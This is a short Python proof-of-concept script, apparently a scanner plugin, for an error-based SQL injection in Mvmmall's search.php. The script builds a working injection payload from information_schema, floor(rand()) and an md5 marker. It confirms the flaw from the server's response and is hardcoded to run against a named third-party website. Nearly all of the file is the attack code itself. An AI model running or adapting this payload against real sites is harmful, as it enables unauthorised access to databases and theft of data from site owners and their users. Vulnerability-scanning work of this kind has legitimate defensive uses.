#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  :  Mvmmall search.php SQL Injection
Reference :  http://www.wooyun.org/bugs/wooyun-2011-01732
Author    :  NoName
"""

import  re
import urlparse
def assign(service, arg):
    if service == "www":
        r = urlparse.urlparse(arg)
        return True, '%s://%s/' % (r.scheme, r.netloc)
       
def audit(arg):
    payload = "search.php?tag_ids[goods_id]=uid))%20and(select%201%20from(select%20count(*),concat((select%20(select%20md5(12345))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%201=1%23"
    code, head, res, errcode, _ = curl.curl(arg + payload)
    if code == 200:
        m = re.search("827ccb0eea8a706c4c34a16891f84e7b1",res)
        if m:
            security_hole('Mvmmall search.php SQL Injection exists.')

if __name__ == '__main__':
    from dummy import *
    audit(assign('www', 'http://dajiamai.com/')[1])